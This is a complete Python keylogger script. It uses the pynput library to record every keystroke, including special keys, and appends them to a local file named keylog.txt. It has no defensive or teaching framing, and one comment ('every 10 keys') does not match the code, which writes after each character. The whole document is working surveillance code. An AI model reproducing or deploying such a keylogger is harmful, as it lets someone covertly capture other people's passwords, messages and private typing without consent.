from pynput import keyboard

# Global list to store pressed keys
pressed_keys = []

# Define a function to write logged keys to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            f.write(str(key))

# Define a function to handle key press events
def on_press(key):
    global pressed_keys
    try:
        # Logging pressed key
        pressed_keys.append(key.char)
        # Write to file every 10 keys (you can adjust this as needed)
    
        write_to_file(pressed_keys)
        pressed_keys = []
    except AttributeError:
        # Logging special keys (e.g., shift, ctrl, etc.)
        pressed_keys.append("   "+str(key)+"   ")

# Set up listener for key press events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
